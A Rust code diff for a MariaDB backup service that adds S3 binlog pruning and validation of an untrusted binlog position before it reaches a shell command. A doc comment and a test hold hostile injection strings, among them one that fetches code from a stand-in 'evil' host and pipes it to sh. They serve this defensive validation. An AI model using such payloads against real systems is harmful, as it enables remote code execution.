@@ -331,7 +331,6 @@ impl std::io::Read for BoundedChunkReader {
 
 /// Longest binlog filename we will accept. Real names are ~20 characters
 /// (`mysql-bin.000007`); this only exists to bound the S3 key we build.
-#[cfg(test)]
 const MAX_BINLOG_FILE_NAME_LEN: usize = 255;
 
 /// Whether `file` is a safe bare binlog filename.
@@ -346,7 +345,6 @@ const MAX_BINLOG_FILE_NAME_LEN: usize = 255;
 ///
 /// Accept only what MariaDB actually produces: a single path component of
 /// `[A-Za-z0-9._-]`, never `.` or `..`.
-#[cfg(test)]
 pub(crate) fn is_safe_binlog_file_name(file: &str) -> bool {
     if file.is_empty() || file.len() > MAX_BINLOG_FILE_NAME_LEN {
         return false;
@@ -1949,6 +1947,223 @@ impl MariaDbService {
         }
     }
 
+    // ── Binary-log retention (PITR "prune what nothing can need" half) ─────
+    //
+    // `archive_binlogs` only ever ADDS objects. Without a counterpart the
+    // `binlog/` prefix grows without bound for the life of the service, which
+    // on a busy database is the single largest unbounded S3 cost Temps can
+    // create. The Postgres side gets this for free (`wal-g delete garbage
+    // ARCHIVES` during a backup delete); MariaDB's archiver is ours, so the
+    // pruning is ours too.
+    //
+    // The retention rule is the same one WAL-G applies: a segment is
+    // unreachable once NO retained base backup could ever replay it. PITR
+    // replay always starts at the base's own recorded `binlog_file`, so the
+    // anchor is the coordinate of the OLDEST base backup still retained.
+    // Everything strictly older than that anchor is dead weight.
+    //
+    // This deletes real backup data, so every uncertainty resolves to "keep":
+    // no anchor => no deletion, unorderable filename => no deletion, failed
+    // delete => stop and leave the manifest claiming the segment is present.
+
+    /// Split a binlog filename into (basename, numeric suffix) — e.g.
+    /// `mysql-bin.000123` -> `("mysql-bin", "000123")`. `None` when the name
+    /// is not MariaDB's `NAME.NNNNNN` shape.
+    pub(crate) fn split_binlog_name(file: &str) -> Option<(&str, &str)> {
+        let (base, suffix) = file.rsplit_once('.')?;
+        if base.is_empty() || suffix.is_empty() || !suffix.chars().all(|c| c.is_ascii_digit()) {
+            return None;
+        }
+        Some((base, suffix))
+    }
+
+    /// Whether `candidate` is *provably* an older segment than `anchor`.
+    ///
+    /// The rest of the binlog code (`binlogs_to_ship`, `fetch_binlogs_for_replay`)
+    /// orders segments lexicographically, which is only equivalent to numeric
+    /// ordering while the zero-padded suffix keeps a fixed width. Shipping /
+    /// replaying under a violated assumption merely re-ships or over-replays;
+    /// DELETING under one destroys recovery data. So this predicate demands
+    /// the strong form — same basename, same suffix width — and answers
+    /// `false` (keep) for anything it cannot order with certainty.
+    pub(crate) fn binlog_is_strictly_older(candidate: &str, anchor: &str) -> bool {
+        match (
+            Self::split_binlog_name(candidate),
+            Self::split_binlog_name(anchor),
+        ) {
+            (Some((candidate_base, candidate_seq)), Some((anchor_base, anchor_seq))) => {
+                candidate_base == anchor_base
+                    && candidate_seq.len() == anchor_seq.len()
+                    && candidate_seq < anchor_seq
+            }
+            _ => false,
+        }
+    }
+
+    /// Read the PITR anchor (`binlog_file`) out of a physical base backup's
+    /// `metadata.json` companion.
+    ///
+    /// `Ok(None)` when the location is not a physical base, or the base was
+    /// taken with binary logging off (`pitr: false` / empty `binlog_file`) —
+    /// such a base records no replay start, so it cannot justify retaining any
+    /// binlog segment. Errors (missing/unparseable companion) propagate so the
+    /// caller can decline to prune rather than guess.
+    pub async fn base_binlog_anchor(
+        &self,
+        s3_client: &aws_sdk_s3::Client,
+        bucket: &str,
+        base_location: &str,
+    ) -> Result<Option<String>> {
+        let base_key = Self::backup_key_from_location(base_location, bucket);
+        if !Self::is_physical_base_location(&base_key) {
+            return Ok(None);
+        }
+        let metadata = self
+            .fetch_base_metadata(s3_client, bucket, &base_key)
+            .await?;
+        let pitr = metadata
+            .get("pitr")
+            .and_then(|v| v.as_bool())
+            .unwrap_or(false);
+        let file = metadata
+            .get("binlog_file")
+            .and_then(|v| v.as_str())
+            .unwrap_or("");
+        if !pitr || file.is_empty() {
+            return Ok(None);
+        }
+        if !is_safe_binlog_file_name(file) {
+            return Err(anyhow::anyhow!(
+                "Base metadata for s3://{}/{} records an unsafe binlog_file '{}'; \
+                 refusing to use it as a retention anchor",
+                bucket,
+                base_key,
+                file
+            ));
+        }
+        Ok(Some(file.to_string()))
+    }
+
+    /// Delete archived binlog segments strictly older than
+    /// `oldest_retained_binlog_file` and rewrite the manifest to match.
+    /// Returns the number of S3 objects deleted.
+    ///
+    /// The caller supplies the anchor: the `binlog_file` coordinate of the
+    /// OLDEST base backup still retained for this service (see
+    /// [`Self::base_binlog_anchor`]). Passing the anchor of anything other
+    /// than the oldest retained base would delete segments a retained base
+    /// still needs, so callers must not shortcut it.
+    ///
+    /// Only segments listed in the manifest are considered — an object in the
+    /// `binlog/` prefix that the manifest does not claim is left alone rather
+    /// than swept, because the manifest is the only record of what this
+    /// service actually shipped.
+    ///
+    /// `last_shipped_file` is never modified: it is the high-water mark that
+    /// gates future shipping, and rewinding it would re-ship every segment.
+    ///
+    /// Shares the archiver's read-modify-write manifest race (health checks run
+    /// concurrently across services, sequentially per service). It is benign
+    /// here for the same reason: a concurrent archive can only ADD segments
+    /// newer than the anchor, never resurrect one older than it, so the worst
+    /// case is a clobbered manifest that the next archive run re-writes.
+    pub async fn prune_stale_binlogs(
+        &self,
+        s3_client: &aws_sdk_s3::Client,
+        s3_source: &temps_entities::s3_sources::Model,
+        oldest_retained_binlog_file: &str,
+    ) -> Result<usize> {
+        if !is_safe_binlog_file_name(oldest_retained_binlog_file) {
+            return Err(anyhow::anyhow!(
+                "Refusing to prune binlogs against unsafe anchor '{}'",
+                oldest_retained_binlog_file
+            ));
+        }
+
+        let bucket = &s3_source.bucket_name;
+        let prefix = s3_source.bucket_path.trim_matches('/');
+
+        let mut manifest = self
+            .read_binlog_manifest(s3_client, bucket, prefix, &self.name)
+            .await?;
+        if manifest.shipped_files.is_empty() {
+            return Ok(0);
+        }
+
+        let stale: Vec<String> = manifest
+            .shipped_files
+            .iter()
+            .filter(|file| Self::binlog_is_strictly_older(file, oldest_retained_binlog_file))
+            .cloned()
+            .collect();
+        if stale.is_empty() {
+            return Ok(0);
+        }
+
+        let mut deleted: Vec<String> = Vec::with_capacity(stale.len());
+        for file in &stale {
+            let key = Self::binlog_object_key(prefix, &self.name, file)?;
+            match s3_client
+                .delete_object()
+                .bucket(bucket)
+                .key(&key)
+                .send()
+                .await
+            {
+                Ok(_) => {
+                    deleted.push(file.clone());
+                }
+                Err(e) => {
+                    // Stop at the first failure and keep the manifest honest:
+                    // an entry we could not delete stays listed as present.
+                    warn!(
+                        service = %self.name,
+                        binlog = %file,
+                        "Failed to delete stale MariaDB binlog s3://{}/{}, stopping prune run: {}",
+                        bucket, key, e
+                    );
+                    break;
+                }
+            }
+        }
+
+        if deleted.is_empty() {
+            return Ok(0);
+        }
+
+        manifest
+            .shipped_files
+            .retain(|file| !deleted.contains(file));
+        manifest.updated_at = chrono::Utc::now().to_rfc3339();
+        if let Err(e) = self
+            .write_binlog_manifest(s3_client, bucket, prefix, &manifest)
+            .await
+        {
+            // The objects are gone; only the bookkeeping write failed. Surface
+            // it — a manifest that still lists deleted segments makes the next
+            // PITR fail loudly on a 404 download instead of silently skipping
+            // them, which is the outcome we want, but the operator should know.
+            return Err(anyhow::anyhow!(
+                "Deleted {} stale MariaDB binlog segment(s) but failed to update the manifest \
+                 (it still lists them; the next PITR will fail on a missing segment until the \
+                 next successful archive run rewrites it): {}",
+                deleted.len(),
+                e
+            ));
+        }
+
+        // Debug, not info: the caller logs the operator-facing summary with
+        // the service id attached. Two info lines per prune is just noise.
+        debug!(
+            service = %self.name,
+            deleted = deleted.len(),
+            anchor = %oldest_retained_binlog_file,
+            "Deleted MariaDB binlog segments older than the oldest retained physical base"
+        );
+
+        Ok(deleted.len())
+    }
+
     async fn dump_all_databases_to_gzip_file(
         &self,
         config: &MariaDbConfig,
@@ -2145,7 +2360,13 @@ impl MariaDbService {
 
     /// True when this backup location is a physical (`mariadb-backup` mbstream)
     /// base — the only kind PITR can replay onto.
-    pub(crate) fn is_physical_base_location(location: &str) -> bool {
+    ///
+    /// `pub` because the generic restore orchestrator (`temps-backup`) has to
+    /// classify a MariaDB backup location the *same* way this engine does when
+    /// it builds the restore plan preview. Two independent copies of the
+    /// predicate would let the preview promise a physical restore the executor
+    /// then performs logically (or vice versa).
+    pub fn is_physical_base_location(location: &str) -> bool {
         location.ends_with("base.mbstream.gz")
     }
 
@@ -3148,9 +3369,21 @@ impl MariaDbService {
             binlog_args.push_str(&Self::shell_single_quote(f));
         }
 
-        // The pinned managed image guarantees bash. `pipefail` makes either a
-        // decoder failure or a client failure fail the replay without staging
+        // The pinned managed image guarantees bash, so we run the decoder and
+        // the client as a single pipefail-protected pipeline rather than
+        // dash's decode-to-file dance: pipefail makes either a decoder
+        // failure or a client failure fail the replay without staging
         // decoded SQL, which can be much larger than the binlog segments.
+        //
+        // `set -x` traces every command AFTER parameter expansion, and
+        // `run_exec` folds that trace into the error text of a failed exec —
+        // which lands verbatim in the UNENCRYPTED `restore_runs.error_message`
+        // column, the server log stream, and the console/CLI run detail. So no
+        // traced line may contain a secret: the client authenticates via the
+        // `MYSQL_PWD`/`MARIADB_PWD` exec env (which `set -x` never prints),
+        // exactly like every other exec in this file, and the password is not
+        // on argv. The trace is worth keeping — it is the only diagnostic a
+        // self-hosted operator gets when a replay fails mid-script.
         let pipeline = format!(
             "{} | \"$CLIENT\" --protocol=TCP -h127.0.0.1 -P3306 --connect-timeout=10 -uroot --binary-mode=1",
             binlog_args
@@ -3369,6 +3602,34 @@ impl MariaDbService {
 
     fn shell_pipeline_with_pipefail(pipeline: &str) -> String {
         format!("bash -o pipefail -c {}", Self::shell_single_quote(pipeline))
+    }
+
+    /// Validate a binlog byte-offset that came from an UNTRUSTED source before
+    /// it is used to build the `mariadb-binlog` replay command.
+    ///
+    /// The value is read out of the base backup's `metadata.json` companion
+    /// object on S3 — a bucket that operators, other Temps instances, and
+    /// anything holding the bucket's credentials can write to. It is
+    /// interpolated into an `sh -c` script, so a value like
+    /// `4; wget http://evil/x -O-|sh; echo ` would otherwise execute inside the
+    /// restored database container.
+    ///
+    /// A real position is always the decimal byte offset reported by
+    /// `SHOW MASTER STATUS`, so anything else is corruption or an attack.
+    /// Reject it with a clear error instead of silently falling back to a
+    /// default position — a PITR that quietly replays from the wrong offset is
+    /// worse than one that refuses to start.
+    pub(crate) fn validate_binlog_position(raw: &str) -> Result<String> {
+        // 20 digits covers u64::MAX; binlog offsets never approach it.
+        if raw.is_empty() || raw.len() > 20 || !raw.chars().all(|c| c.is_ascii_digit()) {
+            return Err(anyhow::anyhow!(
+                "Invalid binlog_position {:?} in MariaDB base backup metadata: expected a \
+                 decimal byte offset of 1-20 digits. Refusing to run point-in-time recovery \
+                 with an untrusted position.",
+                raw
+            ));
+        }
+        Ok(raw.to_string())
     }
 }
 
@@ -4102,13 +4363,21 @@ impl ExternalService for MariaDbService {
                     file
                 ));
             }
+            // Validate BEFORE any container work: `binlog_position` is free-form
+            // text from an S3-hosted `metadata.json` that ends up interpolated
+            // into the replay shell command, so a tampered base must fail here
+            // — loudly, with nothing destroyed — rather than deep inside the
+            // replay script.
             Some(MariaDbBinlogCoordinate {
                 file: Self::normalize_binlog_filename(file)?,
                 position: Self::parse_binlog_position(
-                    metadata
-                        .get("binlog_position")
-                        .and_then(|value| value.as_str())
-                        .unwrap_or("4"),
+                    Self::validate_binlog_position(
+                        metadata
+                            .get("binlog_position")
+                            .and_then(|value| value.as_str())
+                            .unwrap_or("4"),
+                    )?
+                    .as_str(),
                     "physical base metadata",
                 )?,
                 gtid: metadata
@@ -4756,6 +5025,68 @@ mod tests {
     }
 
     #[test]
+    fn split_binlog_name_accepts_only_name_dot_digits() {
+        assert_eq!(
+            MariaDbService::split_binlog_name("mysql-bin.000123"),
+            Some(("mysql-bin", "000123"))
+        );
+        // Multi-dot basename: only the LAST dot separates the sequence.
+        assert_eq!(
+            MariaDbService::split_binlog_name("my.host-bin.000001"),
+            Some(("my.host-bin", "000001"))
+        );
+        assert_eq!(MariaDbService::split_binlog_name("mysql-bin.index"), None);
+        assert_eq!(MariaDbService::split_binlog_name("mysql-bin"), None);
+        assert_eq!(MariaDbService::split_binlog_name(".000001"), None);
+        assert_eq!(MariaDbService::split_binlog_name("mysql-bin."), None);
+    }
+
+    #[test]
+    fn binlog_ordering_is_strict_and_refuses_to_guess() {
+        // Ordinary case: same basename, same width.
+        assert!(MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.000009",
+            "mysql-bin.000010"
+        ));
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.000010",
+            "mysql-bin.000010"
+        ));
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.000011",
+            "mysql-bin.000010"
+        ));
+
+        // Different basename: a segment from a differently-named log file is
+        // NOT comparable, so it must never be deleted.
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "other-bin.000001",
+            "mysql-bin.000010"
+        ));
+
+        // Different suffix width: lexicographic order stops matching numeric
+        // order, so we refuse rather than delete the wrong segment.
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.0000009",
+            "mysql-bin.000010"
+        ));
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.9",
+            "mysql-bin.000010"
+        ));
+
+        // Unparsable names are never deletable.
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.index",
+            "mysql-bin.000010"
+        ));
+        assert!(!MariaDbService::binlog_is_strictly_older(
+            "mysql-bin.000009",
+            "not-a-binlog"
+        ));
+    }
+
+    #[test]
     fn binlog_object_key_handles_empty_and_nonempty_prefix() {
         // Non-empty bucket_path prefix.
         assert_eq!(
@@ -5143,6 +5474,48 @@ mod tests {
                 .status()
                 .expect("bash pipefail command should run");
             assert!(!status.success(), "pipeline {pipeline:?} must fail");
+        }
+    }
+
+    #[test]
+    fn validate_binlog_position_accepts_decimal_offsets() {
+        assert_eq!(
+            MariaDbService::validate_binlog_position("4").expect("plain offset"),
+            "4"
+        );
+        assert_eq!(
+            MariaDbService::validate_binlog_position("18446744073709551615").expect("u64::MAX"),
+            "18446744073709551615"
+        );
+    }
+
+    #[test]
+    fn validate_binlog_position_rejects_shell_metacharacters() {
+        // The exact injection shape a tampered S3 `metadata.json` would use:
+        // without validation this reaches `sh -c` inside the DB container.
+        for hostile in [
+            "4; wget http://evil/x -O-|sh; echo ",
+            "4 && touch /tmp/pwned",
+            "$(id)",
+            "`id`",
+            "4|id",
+            "4\nid",
+            "4'",
+            "",
+            " 4",
+            "4 ",
+            "0x10",
+            "-1",
+            "999999999999999999999", // 21 digits, over the cap
+        ] {
+            let err = MariaDbService::validate_binlog_position(hostile)
+                .expect_err("hostile binlog_position must be rejected");
+            assert!(
+                err.to_string().contains("Invalid binlog_position"),
+                "unexpected error for {:?}: {}",
+                hostile,
+                err
+            );
         }
     }
 
